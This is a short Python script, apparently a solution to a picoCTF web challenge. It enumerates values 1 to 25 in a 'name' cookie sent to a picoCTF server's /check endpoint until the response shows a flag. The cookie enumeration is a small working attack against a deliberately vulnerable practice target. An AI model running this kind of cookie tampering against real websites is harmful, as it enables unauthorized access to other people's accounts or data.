import requests


url ="http://mercury.picoctf.net:29649/check" # change my url with yours
i = 0
count = 0


while i < 25 :
    i += 1
    count += 1
    cookie = { "name" :str(i)}
    guess = requests.get(url , cookies=cookie)
    if "picoCTF{" in guess.text :
        print(count)
        print("flag found :")
        print(guess.text)
        break
    else :
        print(count)
        print("flag not found")
        
     


